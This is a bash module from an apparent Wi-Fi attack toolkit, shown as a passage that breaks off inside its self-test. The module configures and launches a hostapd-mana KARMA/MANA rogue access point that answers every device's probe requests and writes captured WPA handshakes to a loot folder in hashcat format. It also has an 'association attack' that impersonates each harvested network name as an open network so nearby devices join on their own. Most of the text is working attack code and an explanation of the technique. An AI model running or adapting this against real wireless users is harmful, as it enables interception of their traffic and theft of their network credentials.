#!/usr/bin/env bash
# 20_karma.sh — Karma / known-beacons (hostapd-mana responds to any probe)
# ── self-locate WIFISTING_ROOT ──
# When launched via pkexec, HOME is /root and any $HOME-relative path
# would land in the wrong place. Resolve WIFISTING_ROOT from this
# script's own path so state / loot / captures always end up in the
# project tree regardless of who runs us.
if [[ -z "${WIFISTING_ROOT:-}" ]]; then
    _sl_src="${BASH_SOURCE[0]}"
    while [ -L "$_sl_src" ]; do
        _sl_dir="$(cd -P "$(dirname "$_sl_src")" && pwd)"
        _sl_tgt="$(readlink "$_sl_src")"
        [[ "$_sl_tgt" != /* ]] && _sl_tgt="$_sl_dir/$_sl_tgt"
        _sl_src="$_sl_tgt"
    done
    WIFISTING_ROOT="$(cd -P "$(dirname "$_sl_src")/.." && pwd)"
    export WIFISTING_ROOT
    unset _sl_src _sl_dir _sl_tgt
fi

# Under pkexec, HOME=/root even though we're writing to the invoking
# user's tree. WIFISTING_ROOT is <real_home>/wifisting, so its parent
# is the real home. Reset HOME so downstream $HOME-relative defaults
# (LOOT_DIR, CAPTURES_DIR, LOGS_DIR, XDG_CONFIG_HOME, etc.) resolve
# to the user's paths instead of /root.
if [[ -n "${WIFISTING_ROOT:-}" ]]; then
    _real_home="$(dirname "$WIFISTING_ROOT")"
    if [[ -n "$_real_home" && -d "$_real_home" && "$HOME" != "$_real_home" ]]; then
        export HOME="$_real_home"
    fi
    unset _real_home
fi

: "${WIFISTING_HOME:=$WIFISTING_ROOT}"

: "${TMP_DIR:=/tmp/wifisting}"
: "${LOOT_DIR:=$HOME/wifisting/loot}"
: "${LOGS_DIR:=$HOME/wifisting/logs}"
: "${CAPTURES_DIR:=$HOME/wifisting/captures}"
: "${WIFISTING_HOME:=$HOME/wifisting}"
: "${WIFISTING_ROOT:=$HOME/wifisting}"
mkdir -p "$TMP_DIR" "$LOOT_DIR" "$LOGS_DIR" "$CAPTURES_DIR" 2>/dev/null

KARMA_DIR="$TMP_DIR/karma"
KARMA_LOOT="$LOOT_DIR/karma"
KARMA_LOG_DIR="$KARMA_DIR/logs"
KARMA_CONF="$KARMA_DIR/hostapd-mana.conf"
# ── iface arbitration ──
# Karma puts the adapter in AP mode, which conflicts with monitor mode, so it
# takes the same lock. Because it DAEMONISES, the holder is the mana pid (the
# CLI exits immediately) — see karma_start/karma_stop.
IFACE_MODULE="$WIFISTING_ROOT/modules/01_iface.sh"

KARMA_PID="$KARMA_DIR/mana.pid"
KARMA_PROBES="$KARMA_DIR/probes.log"
KARMA_WHITELIST="$KARMA_DIR/whitelist.txt"

# MANA loud state + the artifacts the association attack writes. All of it is
# scratch under $KARMA_DIR; loot/karma is only ever written by karma_start.
KARMA_LOUD_STATE="$KARMA_DIR/mana_loud"
KARMA_OUTFILE="$KARMA_DIR/mana.out"
KARMA_ASSOC_CONF="$KARMA_DIR/assoc-attack.conf"
KARMA_ASSOC_BEACONS="$KARMA_DIR/assoc-attack.ssids"
KARMA_ASSOC_PLAN="$KARMA_DIR/assoc-attack.plan"

mkdir -p "$KARMA_DIR" "$KARMA_LOOT" "$KARMA_LOG_DIR"
touch "$KARMA_PROBES" 2>/dev/null

# ── interface listing ──

karma_list_ifaces_tsv() {
    local name mode
    for name in $(iw dev 2>/dev/null | awk '/Interface/{print $2}'); do
        mode=$(iw dev "$name" info 2>/dev/null | awk '/type/ {print $2}')
        [[ "$mode" == "monitor" ]] && continue
        printf '%s\t%s\n' "$name" "${mode:-?}"
    done
}

# ── hostapd-mana detection ──

karma_find_mana() {
    if command -v hostapd-mana >/dev/null 2>&1; then
        command -v hostapd-mana
        return 0
    fi
    for p in /usr/local/bin/hostapd-mana \
             "$WIFISTING_ROOT/external/hostapd-mana/hostapd/hostapd-mana" \
             "$HOME/wifisting/external/hostapd-mana/hostapd/hostapd-mana"; do
        [[ -x "$p" ]] && { echo "$p"; return 0; }
    done
    return 1
}

# ── status ──

karma_status_tsv() {
    local running=0 pid=""
    if [[ -f "$KARMA_PID" ]]; then
        pid=$(cat "$KARMA_PID")
        kill -0 "$pid" 2>/dev/null && running=1
    fi
    # Fallback detection
    if (( running == 0 )); then
        local p
        p=$(pgrep -f hostapd-mana | head -1)
        [[ -n "$p" ]] && { running=1; pid="$p"; }
    fi

    local probes=0
    [[ -f "$KARMA_PROBES" ]] && probes=$(wc -l < "$KARMA_PROBES")

    local mana_ok="no"
    if karma_find_mana >/dev/null 2>&1; then
        mana_ok="$(karma_find_mana)"
    fi

    printf 'running\t%s\n'  "$running"
    printf 'pid\t%s\n'      "$pid"
    printf 'iface\t%s\n'    "${KARMA_IFACE:-}"
    printf 'probes\t%s\n'   "$probes"
    printf 'mana\t%s\n'     "$mana_ok"
    printf 'loot\t%s\n'     "$KARMA_LOOT"
    printf 'log\t%s\n'      "$KARMA_LOG_DIR/mana.log"
}

# ── config writer ──
# FIXED: hccapx -> hc22000 (modern hashcat format)
# Added: whitelist for targeted karma (only respond to specific SSID prefixes)

# ── MANA loud ────────────────────────────────────────────────────────────
# Directives below are the ones hostapd-mana itself documents (its shipped
# hostapd/hostapd.conf sample). The authoritative list is the set of keys its
# parser actually accepts (hostapd/config_file.c):
#
#   enable_mana=1     perform MANA — answer probes per device, not just the
#                     networks this AP advertises
#   mana_loud=1       "loud" mode: re-broadcast ALL networks to ALL devices,
#                     including SSIDs learned from other devices' probes,
#                     instead of only answering each client's own PNL
#   mana_outfile=...  device/SSID activity log; with the two track_* limits
#                     below it is what the rebroadcast set is learned from
#   track_sta_max_num / track_sta_max_age  taxonomy bookkeeping for the above
#   mana_ssid_filter_file=...   restrict rebroadcasting to a whitelist
#   mana_ssid_filter_type=1     1 = white list, 0 = black list (default 1)
#   mana_macacl=0|1   extend the normal hostapd MAC ACL to probe responses
#   mana_wpe=0|1      EAP credential capture (WPE) — off by default
#   mana_wpaout=...   captured WPA handshakes (hashcat 22000)
#
# hostapd-mana parses its config strictly: an unrecognised key is an error and
# hostapd_config_read() then returns NULL, so the daemon refuses to start. The
# module used to emit three keys that appear nowhere in that parser —
# `mana_karma_whitelist` (real name: mana_ssid_filter_file), `mana_mac`
# (real name: mana_macacl) and `mana_eap` (real name: mana_wpe) — plus
# `mana_logfile=`, which is not a directive either: hostapd logs to
# syslog/stdout, and karma_start already redirects the daemon's own output to
# $KARMA_LOG_DIR/mana.log.
karma_mana_loud_get() {
    local state=""
    [[ -f "$KARMA_LOUD_STATE" ]] && state=$(tr -d '[:space:]' < "$KARMA_LOUD_STATE")
    case "$state" in
        off|0) printf 'off\n' ;;
        *)     printf 'on\n'  ;;   # default: loud, as this module always was
    esac
}

karma_mana_loud_set() {
    local want="${1:-}"
    case "$want" in
        on|1|true)   want="on" ;;
        off|0|false) want="off" ;;
        "")  printf 'usage: --mana-loud on|off\n' >&2; return 2 ;;
        *)   printf 'ERROR\t--mana-loud takes on or off, got: %s\n' "$want" >&2
             return 2 ;;
    esac
    mkdir -p "$KARMA_DIR"
    printf '%s\n' "$want" > "$KARMA_LOUD_STATE" || {
        printf 'ERROR\tcould not write %s\n' "$KARMA_LOUD_STATE" >&2
        return 1
    }
    printf 'MANA_LOUD\t%s\n' "$want"
    if [[ "$want" == "on" ]]; then
        printf 'DIRECTIVE\tenable_mana=1\n'
        printf 'DIRECTIVE\tmana_loud=1\n'
        printf 'DIRECTIVE\tmana_outfile=%s\n' "$KARMA_OUTFILE"
        printf 'DIRECTIVE\ttrack_sta_max_num=100\n'
        printf 'DIRECTIVE\ttrack_sta_max_age=180\n'
        printf 'EFFECT\tanswer every probe and rebroadcast SSIDs learned from other devices\n'
    else
        printf 'DIRECTIVE\tenable_mana=1\n'
        printf 'DIRECTIVE\tmana_loud=0\n'
        printf 'EFFECT\tanswer each client only for the SSIDs in its own PNL\n'
    fi

    local mana
    mana=$(karma_find_mana) || mana=""
    if [[ -z "$mana" ]]; then
        printf 'TOOLING\tabsent\n'
        printf 'NOTE\thostapd-mana is NOT installed on this machine'
        local plain
        plain=$(command -v hostapd 2>/dev/null)
        [[ -n "$plain" ]] && printf ' (found plain hostapd at %s)' "$plain"
        printf '; the directives above are hostapd-mana only and plain hostapd does not understand them\n'
    else
        printf 'TOOLING\t%s\n' "$mana"
    fi

    # Keep an already-generated config in sync with the new mode. Nothing is
    # created here (generating the config is --start's job), but a config left
    # over from an earlier run must not silently keep the old mana_loud value.
    if [[ -f "$KARMA_CONF" ]]; then
        local old_iface old_chan
        old_iface=$(awk -F= '$1=="interface"{print $2; exit}' "$KARMA_CONF")
        old_chan=$(awk -F= '$1=="channel"{print $2; exit}' "$KARMA_CONF")
        karma_write_conf "${old_iface:-wlan0}" "${old_chan:-6}" >/dev/null
        printf 'CONF\t%s\n' "$KARMA_CONF"
    fi
    return 0
}

karma_write_conf() {
    local iface="$1" chan="$2"
    local whitelist_line=""

    if [[ -s "$KARMA_WHITELIST" ]]; then
        # hostapd-mana's SSID white-list file. mana_ssid_filter_type defaults
        # to 1 (white list), which is what this module wants.
        whitelist_line="mana_ssid_filter_file=$KARMA_WHITELIST"
    fi

    local loud mana_block
    loud=$(karma_mana_loud_get)
    if [[ "$loud" == "on" ]]; then
        mana_block=$(cat << EOF
# MANA — answer every probe, not only the networks this AP advertises.
enable_mana=1
# Loud: re-broadcast all networks to all devices, including SSIDs learned
# from other devices' probe requests (not just this client's own PNL).
mana_loud=1
# Device/SSID activity log; with the track limits this is what the
# rebroadcast set is learned from.
mana_outfile=$KARMA_OUTFILE
track_sta_max_num=100
track_sta_max_age=180
EOF
)
    else
        mana_block=$(cat << EOF
# MANA — per-device mode: answer each client only for networks in its PNL.
enable_mana=1
mana_loud=0
EOF
)
    fi

    cat > "$KARMA_CONF" << EOF
interface=$iface
driver=nl80211
ssid=wifisting-karma
channel=$chan
hw_mode=g
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0

# Karma — respond to every probe request
enable_karma=1

$mana_block

# Extend the normal hostapd MAC ACL (macaddr_acl above) to probe responses.
mana_macacl=1

# WPA handshake capture — hashcat 22000 format
mana_wpaout=$KARMA_LOOT/handshakes.hc22000

# EAP credential capture / WPE (off by default; enable for enterprise Karma)
mana_wpe=0

# NB: there is no logfile directive. hostapd logs to syslog/stdout and
# karma_start redirects the daemon's output to $KARMA_LOG_DIR/mana.log;
# per-device activity goes to mana_outfile above.
$whitelist_line
EOF
    printf 'CONF\t%s\n' "$KARMA_CONF"
}

# ── start ──

karma_start() {
    local iface="$1" chan="${2:-6}"
    [[ -z "$iface" ]] && { printf 'ERROR\tmissing iface\n' >&2; return 2; }

    if [[ -f "$KARMA_PID" ]] && kill -0 "$(cat "$KARMA_PID")" 2>/dev/null; then
        printf 'ERROR\tkarma already running\n' >&2; return 1
    fi

    KARMA_IFACE="$iface"
    export KARMA_IFACE

    # Generate the config BEFORE checking for the binary: the config is the
    # artifact this module can always produce, and it is the evidence a user
    # needs when hostapd-mana has to be installed separately.
    karma_write_conf "$iface" "$chan" >/dev/null

    local bin
    bin=$(karma_find_mana) || {
        printf 'ERROR\thostapd-mana not installed — refusing to start\n' >&2
        local _plain
        _plain=$(command -v hostapd 2>/dev/null)
        if [[ -n "$_plain" ]]; then
            printf 'REFUSE\tplain hostapd (%s) cannot serve the KARMA/MANA config this module generates — it has no enable_karma/enable_mana/mana_loud directives\n' \
                "$_plain" >&2
        else
            printf 'REFUSE\tno AP daemon on PATH (hostapd-mana or hostapd)\n' >&2
        fi
        printf 'HINT\tthe config at %s is still generated and is valid for hostapd-mana\n' \
            "$KARMA_CONF" >&2
        printf 'HINT\tsee module 15 CVE scanner → install deps\n' >&2
        return 1
    }

    airmon-ng check kill >/dev/null 2>&1 || true
    ip link set "$iface" down 2>/dev/null || true
    ip link set "$iface" up 2>/dev/null || true

    : > "$KARMA_LOG_DIR/mana.log"

    # Launch in its own process group so we can kill children cleanly
    setsid "$bin" "$KARMA_CONF" > "$KARMA_LOG_DIR/mana.log" 2>&1 &
    local pid=$!
    echo "$pid" > "$KARMA_PID"
    sleep 2

    if kill -0 "$pid" 2>/dev/null; then
        # Hold the adapter while mana runs. If another module already has it,
        # tear the daemon back down rather than fighting over the iface.
        if [[ -x "$IFACE_MODULE" ]] && \
           ! "$IFACE_MODULE" --lock-claim "$KARMA_IFACE" "20_karma" "$pid" \
                >/dev/null 2>&1; then
            kill -TERM "-$pid" 2>/dev/null || kill -TERM "$pid" 2>/dev/null
            rm -f "$KARMA_PID"
            printf 'ERROR\tinterface busy (held by another module)\n' >&2
            return 1
        fi
        printf 'STARTED\t%s\n' "$pid"
    else
        printf 'ERROR\tfailed to start — check %s\n' "$KARMA_LOG_DIR/mana.log" >&2
        return 1
    fi
}

karma_stop() {
    local stopped=0
    if [[ -f "$KARMA_PID" ]]; then
        local pid
        pid=$(cat "$KARMA_PID")
        if stop_kill_pid "$pid"; then
            stopped=1
        fi
        # Owner-checked release: no-op if another module has since taken it.
        [[ -x "$IFACE_MODULE" ]] && \
            "$IFACE_MODULE" --lock-release "" "$pid" >/dev/null 2>&1
        if (( stopped == 1 )); then
            rm -f "$KARMA_PID"
        else
            printf 'ERROR\tmana pid %s survived SIGKILL (pidfile kept)\n' \
                "$pid" >&2
        fi
    fi
    stop_sweep 'hostapd-mana' && stopped=1
    systemctl restart NetworkManager 2>/dev/null || true
    printf 'STOPPED\t%s\n' "$stopped"
    (( stopped == 1 )) && return 0
    [[ -f "$KARMA_PID" ]] && return 1
    return 0
}

# ── logs ──

karma_log_tail() {
    [[ -f "$KARMA_LOG_DIR/mana.log" ]] && tail -80 "$KARMA_LOG_DIR/mana.log"
    return 0
}

karma_probes_tail() {
    [[ -f "$KARMA_PROBES" ]] && tail -80 "$KARMA_PROBES"
    return 0
}

# ── probe parsing ──
# Extract client MAC + probed SSID from the mana log.
karma_harvest() {
    local log="$KARMA_LOG_DIR/mana.log"
    [[ ! -f "$log" ]] && { printf 'NONE\n'; return 1; }

    # mana's log format varies; we accept multiple patterns.
    # Typical: "MANA: Association: <mac> (<ssid>)"
    # Or newer: "AP-STA-CONNECTED <mac>"
    # Also: any line with a MAC + SSID pair
    {
        grep -oE '\(ESSID:[^)]+\)' "$log" 2>/dev/null | sed 's/(ESSID: //;s/)//' | sort -u
        grep -oE 'Association.*\(([^)]+)\)' "$log" 2>/dev/null | sed 's/.*(//;s/)//' | sort -u
        grep -oE 'ssid=[^ ]+' "$log" 2>/dev/null | sed 's/ssid=//' | sort -u
    } | grep -v '^$' | awk '!seen[$0]++' | tee -a "$KARMA_PROBES"
}

# ── whitelist ──
karma_whitelist_add() {
    local prefix="$1"
    [[ -z "$prefix" ]] && { printf 'ERROR\tmissing prefix\n' >&2; return 2; }
    printf '%s\n' "$prefix" >> "$KARMA_WHITELIST"
    printf 'ADDED\t%s\n' "$prefix"
}

karma_whitelist_clear() {
    : > "$KARMA_WHITELIST"
    printf 'CLEARED\n'
}

karma_whitelist_list() {
    [[ -s "$KARMA_WHITELIST" ]] && cat "$KARMA_WHITELIST"
    return 0
}

# ═══════════════════════════════════════════════════════════════════
#  association attack / open auto-reconnect
# ═══════════════════════════════════════════════════════════════════
# Clients that have a network in their PNL (preferred network list) will
# auto-connect to it when it appears, with no user interaction. So the
# attack is: take every SSID this module has harvested from probe requests,
# stand up an OPEN BSS for each of them, and wait for clients to associate.
# Nothing is cracked — the client volunteers the association.

# SSID -> how many times it was seen, from the mana log and/or the PNL file
# this module already keeps. Emits: SSID<TAB>COUNT<TAB>SOURCE
karma_pnl_targets() {
    local src_log="$KARMA_LOG_DIR/mana.log"
    local src_pnl="$KARMA_PROBES"
    local log_tmp="$KARMA_DIR/.pnl-log.$$"
    local pnl_tmp="$KARMA_DIR/.pnl-pnl.$$"

    : > "$log_tmp" 2>/dev/null || return 1
    : > "$pnl_tmp" 2>/dev/null || { rm -f "$log_tmp"; return 1; }

    if [[ -f "$src_log" ]]; then
        {
            # "MANA: Probe request from <mac> for SSID 'HomeNet'" and friends.
            # \x27/\x22 keep the quote characters out of the shell quoting.
            grep -oP "(?<=for SSID )[\x27\x22][^\x27\x22]+[\x27\x22]" "$src_log" 2>/dev/null |
                tr -d "\"'"
            grep -oP '\(ESSID: [^)]+\)' "$src_log" 2>/dev/null | sed 's/(ESSID: //; s/)//'
            grep -oP '(?<=ssid=)[^[:space:]]+' "$src_log" 2>/dev/null
            grep -oP '(?<=Association: ).*\([^)]+\)' "$src_log" 2>/dev/null |
                sed 's/.*(//; s/)//'
        } | tr -d '\r' | grep -v '^[[:space:]]*$' >> "$log_tmp"
    fi

    [[ -f "$src_pnl" ]] && tr -d '\r' < "$src_pnl" | grep -v '^[[:space:]]*$' >> "$pnl_tmp"

    awk -F'\t' '
        FNR==NR { if ($0 != "") logc[$0]++; next }
        { if ($0 != "") pnlc[$0]++ }
        END {
            for (s in logc) { c[s] += logc[s]; src[s] = "mana-log" }
            for (s in pnlc) {
                c[s] += pnlc[s]
                src[s] = (s in logc) ? "mana-log+pnl-log" : "pnl-log"
            }
            for (s in c) printf "%s\t%d\t%s\n", s, c[s], src[s]
        }
    ' "$log_tmp" "$pnl_tmp" | sort -t$'\t' -k2,2nr -k1,1

    rm -f "$log_tmp" "$pnl_tmp"
    return 0
}

# Pure decision function over the probed facts, so every branch is testable
# without a radio. Prints the refusal reason, or nothing + rc 1 when the
# association attack may actually run.
karma_ap_refusal_reason() {
    local iface="$1" ap_mode="$2" mode="$3" connected="$4" backend="$5"
    if [[ -z "$iface" ]]; then
        printf 'no wireless interface available for AP mode\n'
        return 0
    fi
    if [[ "$ap_mode" != "yes" ]]; then
        printf '%s does not advertise AP mode (iw phy info)\n' "$iface"
        return 0
    fi
    if [[ "$connected" == "yes" ]]; then
        printf '%s is carrying the live connection (iw dev %s link) — refusing to take the operator offline for a rogue AP\n' \
            "$iface" "$iface"
        return 0
    fi
    if [[ "$mode" == "monitor" ]]; then
        printf '%s is in monitor mode and is the only monitor adapter — bringing up an AP on it would tear down the monitor interface\n' \
            "$iface"
        return 0
    fi
    if [[ -z "$backend" ]]; then
        printf 'no AP backend installed (need hostapd-mana or hostapd)\n'
        return 0
    fi
    return 1
}

karma_backend_for() {
    local mana
    if mana=$(karma_find_mana); then printf 'hostapd-mana\n'; return 0; fi
    if command -v hostapd >/dev/null 2>&1; then printf 'hostapd\n'; return 0; fi
    return 1
}

# Pick the interface to stand the AP up on: prefer a non-monitor, unconnected,
# AP-capable iface. Prints IFACE<TAB>AP_MODE<TAB>MODE<TAB>CONNECTED.
karma_ap_iface_report() {
    local want="${1:-}" name ap mode conn phy
    local names=()
    if [[ -n "$want" ]]; then
        names=("$want")
    else
        while IFS= read -r name; do
            [[ -n "$name" ]] && names+=("$name")
        done < <(iw dev 2>/dev/null | awk '/Interface/{print $2}')
    fi
    [[ ${#names[@]} -eq 0 ]] && { printf '\tno\t?\t?\n'; return 0; }

    for name in "${names[@]}"; do
        [[ -e "/sys/class/net/$name" ]] || continue
        mode=$(iw dev "$name" info 2>/dev/null | awk '/type/ {print $2; exit}')
        phy=$(cat "/sys/class/net/$name/phy80211/name" 2>/dev/null)
        ap="no"
        if [[ -n "$phy" ]] && iw phy "$phy" info 2>/dev/null | grep -qE '^[[:space:]]*\* AP$|AP/VLAN'; then
            ap="yes"
        fi
        conn="no"
        iw dev "$name" link 2>/dev/null | grep -q '^Connected to' && conn="yes"
        printf '%s\t%s\t%s\t%s\n' "$name" "$ap" "${mode:-?}" "$conn"
        return 0
    done
    printf '\tno\t?\t?\n'
}

# hostapd config that imitates every harvested SSID as its own OPEN BSS.
karma_write_assoc_conf() {
    local ssids="$1" iface="$2" chan="${3:-6}"
    local idx=0 ssid
    : > "$KARMA_ASSOC_CONF"
    {
        printf '# association attack — open BSS per harvested PNL SSID\n'
        printf '# generated by 20_karma.sh --assoc-attack; scratch, not loot\n'
        printf 'interface=%s\n' "$iface"
        printf 'driver=nl80211\n'
        printf 'hw_mode=g\n'
        printf 'channel=%s\n' "$chan"
        printf 'macaddr_acl=0\n'
        printf 'auth_algs=1\n'
        printf 'ignore_broadcast_ssid=0\n'
        printf 'wmm_enabled=1\n'
    } >> "$KARMA_ASSOC_CONF"

    while IFS= read -r ssid; do
        [[ -z "$ssid" ]] && continue
        idx=$(( idx + 1 ))
        if (( idx == 1 )); then
            # first SSID is the primary BSS of the interface
            printf 'ssid=%s\n' "$ssid" >> "$KARMA_ASSOC_CONF"
            printf '# open network: no wpa= / wpa_key_mgmt=, so clients reconnect with no credential\n' \
                >> "$KARMA_ASSOC_CONF"
        else
            printf '\nbss=%s\nssid=%s\nwmm_enabled=1\n' "$iface" "$ssid" \
                >> "$KARMA_ASSOC_CONF"
        fi
    done < "$ssids"

    printf 'CONF\t%s\n' "$KARMA_ASSOC_CONF"
    printf 'BSS_COUNT\t%s\n' "$idx"
}

karma_assoc_plan() {
    local iface="$1" backend="$2" targets="$3"
    local n
    n=$(printf '%s\n' "$targets" | grep -c . || true)
    printf 'PLAN\tverb\t--assoc-attack\n'
    printf 'PLAN\tiface\t%s\n' "${iface:-<none available>}"
    printf 'PLAN\tbackend\t%s\n' "${backend:-<none installed>}"
    printf 'PLAN\tstrategy\topen-auto-reconnect — imitate harvested PNL SSIDs as open BSSs\n'
    printf 'PLAN\tsource\tprobing/PNL log (%s) and %s\n' "$KARMA_PROBES" "$KARMA_LOG_DIR/mana.log"
    printf 'PLAN\ttarget_count\t%s\n' "${n:-0}"
    printf 'PLAN\tconfig\t%s\n' "$KARMA_ASSOC_CONF"
    printf 'PLAN\tbeacon_list\t%s\n' "$KARMA_ASSOC_BEACONS"
    printf 'PLAN\tstep\t1. read every SSID the module has already harvested from probes\n'
    printf 'PLAN\tstep\t2. emit one OPEN BSS per SSID so clients auto-reconnect unprompted\n'
    printf 'PLAN\tstep\t3. run the AP backend and watch for associations in %s\n' \
        "$KARMA_LOG_DIR/mana.log"
    printf 'PLAN\talt\tmdk4 IFACE b -f %s  (beacon-flood variant, needs a monitor iface)\n' \
        "$KARMA_ASSOC_BEACONS"
    printf 'PLAN\thonesty\tno credential is cracked here — the client volunteers the association\n'
}

karma_cli_assoc_attack() {
    local want_iface="${1:-}"
    local iface ap mode conn targets backend reason

    targets=$(karma_pnl_targets)
    if [[ -z "$targets" ]]; then
        printf 'ERROR\tno PNL/probe data — run --start or --harvest first so there are SSIDs to imitate\n' >&2
        printf 'NONE\t0\n'
        return 1
    fi

    mkdir -p "$KARMA_DIR"
    printf '%s\n' "$targets" | awk -F'\t' '{ printf "TARGET\t%s\t%s\t%s\n", $1, $2, $3 }'
    printf '%s\n' "$targets" | awk -F'\t' '{ print $1 }' > "$KARMA_ASSOC_BEACONS"

    IFS=$'\t' read -r iface ap mode conn < <(karma_ap_iface_report "$want_iface")
    backend=$(karma_backend_for)

    karma_write_assoc_conf "$KARMA_ASSOC_BEACONS" "${iface:-IFACE}" "${KARMA_CHAN:-6}"
    karma_assoc_plan "$iface" "$backend" "$targets" | tee "$KARMA_ASSOC_PLAN"

    reason=$(karma_ap_refusal_reason "$iface" "$ap" "$mode" "$conn" "$backend")
    if [[ -n "$reason" ]]; then
        printf 'REFUSE\tassociation attack not run: %s\n' "$reason" >&2
        printf 'STATE\trefused\n'
        return 1
    fi

    if [[ "$backend" == "hostapd-mana" ]]; then
        printf 'START\t%s %s\n' "$(karma_find_mana)" "$KARMA_ASSOC_CONF"
    else
        printf 'START\thostapd %s (open-BSS imitation; no karma/mana directives)\n' "$KARMA_ASSOC_CONF"
    fi
    warn "association attack running on $iface — press ctrl-c to stop"
    hostapd "$KARMA_ASSOC_CONF" 2>&1 | tee -a "$KARMA_LOG_DIR/assoc-attack.log"
}

# ═══════════════════════════════════════════════════════════════════
#  --info
# ═══════════════════════════════════════════════════════════════════
karma_info() {
    cat <<'EOF'
KARMA / MANA — rogue AP that answers clients' own probe requests

  What it is
    A client broadcasts probe requests for networks in its PNL (preferred
    network list). KARMA answers every probe with "that network is me", so
    the client associates to the attacker instead of the real AP. MANA is
    SensePost's improved KARMA: it also answers broadcast probes and can
    appear as a different BSS per device.

  MANA modes (directives from hostapd-mana's own shipped hostapd.conf)
    enable_mana=1        perform MANA at all
    mana_loud=0          per-device: rebroadcast a probed network ONLY to the
                         device that probed for it (the client's own PNL)
    mana_loud=1          LOUD: advertise ALL learned networks to ALL devices
    mana_outfile=FILE    device/SSID activity log. With the track limits below
                         this is what the rebroadcast set is learned from:
    track_sta_max_num=100
    track_sta_max_age=180
    mana_ssid_filter_file=FILE   restrict rebroadcasting to a whitelist
    mana_macacl=1        (with a normal MAC ACL) never send mgmt frames to
                         listed MACs — i.e. hide from chosen devices
    mana_wpaout=FILE     write captured WPA handshakes (hashcat 22000)
    mana_credout=FILE    write captured credentials
    mana_loud is therefore the switch between "answer this client's PNL only"
    and "answer every probe and rebroadcast what other devices revealed".

  What this module can and cannot do here
    Config generation, whitelisting, PNL harvesting and the association
    target list are offline and always work. Launching requires the
    hostapd-mana binary: plain hostapd has no enable_karma / enable_mana /
    mana_loud directives, so --start refuses by name rather than starting a
    daemon that would not perform KARMA. This machine has plain hostapd and
    NOT hostapd-mana; check the TOOLING line from --mana-loud.

  Association attack / open auto-reconnect (--assoc-attack)
    Separate from KARMA: take every SSID already harvested from probe
    requests and stand up an OPEN BSS for each. Devices auto-connect to
    known SSIDs with no user interaction, so no credential is cracked and
    none is needed. The verb lists which SSIDs are imitated and how many
    times each was seen, writes the hostapd config, and then either runs it
    or refuses by name (no AP-capable/free interface, or no backend).

  Output is TSV. Errors go to stderr and the verb returns non-zero.
EOF
}

# ── self-test ────────────────────────────────────────────────────────────
# Offline only: no radio, no root, no network, hostapd-mana is never
# launched. Config/whitelist/probe paths are shadowed into a scratch dir
# under $KARMA_DIR and removed before returning; loot/karma is untouched.
karma_selftest() {
    local bad=0
    chk() {
        local n="$1" got="$2" want="$3"
        if [[ "$got" == "$want" ]]; then printf '%s\tPASS\n' "$n"
        else printf '%s\tFAIL want=%s got=%s\n' "$n" "$want" "$got"; bad=$((bad+1)); fi
    }

    local st="$KARMA_DIR/selftest-$$"
    rm -rf "$st"; mkdir -p "$st/logs"
    local KARMA_DIR="$st" \
          KARMA_CONF="$st/hostapd-mana.conf" KARMA_LOOT="$st/loot" \
          KARMA_LOG_DIR="$st/logs" KARMA_WHITELIST="$st/whitelist.txt" \
          KARMA_PROBES="$st/probes.log" KARMA_PID="$st/mana.pid" \
          KARMA_LOUD_STATE="$st/mana_loud" KARMA_OUTFILE="$st/mana.out" \
          KARMA_ASSOC_CONF="$st/assoc-attack.conf" \
          KARMA_ASSOC_BEACONS="$st/assoc-attack.ssids" \
          KARMA_ASSOC_PLAN="$st/assoc-attack.plan"
    local field
    field() { awk -F= -v k="$2" '$1==k{print $2; exit}' "$1"; }

    # ── hostapd-mana.conf ──
    local conf_line; conf_line=$(karma_write_conf "wlan9" "6")
    chk conf-path "$(printf '%s\n' "$conf_line" | awk -F'\t' '$1=="CONF"{print $2}')" "$KARMA_CONF"
    chk conf-interface "$(field "$KARMA_CONF" interface)"    "wlan9"
    chk conf-driver    "$(field "$KARMA_CONF" driver)"       "nl80211"
    chk conf-ssid      "$(field "$KARMA_CONF" ssid)"         "wifisting-karma"
    chk conf-channel   "$(field "$KARMA_CONF" channel)"      "6"
    chk conf-karma     "$(field "$KARMA_CONF" enable_karma)" "1"
    chk conf-loud      "$(field "$KARMA_CONF" mana_loud)"    "1"
    # Capture output must point at the loot dir, and be hc22000 (not hccapx).
    chk conf-wpaout    "$(field "$KARMA_CONF" mana_wpaout)"  "$KARMA_LOOT/handshakes.hc22000"
    # Every man_* key emitted must be one hostapd-mana's parser accepts:
    # mana_loud, mana_outfile, mana_ssid_filter_file, mana_ssid_filter_type,
    # mana_macacl, mana_wpe, mana_wpaout, mana_credout, mana_eapsuccess,
    # mana_eaptls. An unknown key is a hard error and hostapd refuses to start.
    chk conf-no-unknown-mana-keys \
        "$(grep -oE '^mana_[a-z_]+' "$KARMA_CONF" | sort -u | \
           grep -vcE '^mana_(loud|outfile|ssid_filter_file|ssid_filter_type|macacl|wpe|wpaout|credout|eapsuccess|eaptls)$')" "0"
    # The corrected names, and the three invented ones gone for good.
    chk conf-macacl       "$(field "$KARMA_CONF" mana_macacl)" "1"
    chk conf-wpe          "$(field "$KARMA_CONF" mana_wpe)"    "0"
    chk conf-no-mana-mac  "$(grep -c '^mana_mac=' "$KARMA_CONF")"   "0"
    chk conf-no-mana-eap  "$(grep -c '^mana_eap=' "$KARMA_CONF")"   "0"
    # There is no logfile directive; the log comes from karma_start's
    # redirection of the daemon's own stdout/stderr.
    chk conf-no-logfile-directive "$(grep -c '^mana_logfile=' "$KARMA_CONF")" "0"
    chk start-redirects-log \
        "$(grep -c '"\$KARMA_LOG_DIR/mana.log" 2>&1 &' "${BASH_SOURCE[0]}")" "1"
    # No whitelist configured yet -> no mana_ssid_filter_file directive.
    chk conf-no-whitelist-line "$(grep -c '^mana_ssid_filter_file=' "$KARMA_CONF")" "0"

    # ── whitelist round trip, then it must show up in the config ──
    chk wl-add "$(karma_whitelist_add 'HomeNet')" $'ADDED\tHomeNet'
    karma_whitelist_add 'Cafe' >/dev/null
    chk wl-list "$(karma_whitelist_list)" "$(printf '%s\n' HomeNet Cafe)"
    karma_write_conf "wlan9" "6" >/dev/null
    chk conf-whitelist-line "$(field "$KARMA_CONF" mana_ssid_filter_file)" "$KARMA_WHITELIST"
    chk conf-whitelist-not-legacy "$(grep -c '^mana_karma_whitelist=' "$KARMA_CONF")" "0"
    karma_whitelist_add "" >/dev/null 2>&1
    chk wl-add-empty-rc "$?" "2"
    chk wl-clear "$(karma_whitelist_clear)" "CLEARED"
    chk wl-cleared-empty "$(karma_whitelist_list)" ""

    # ── probe harvest: union of the three mana log formats, deduped ──
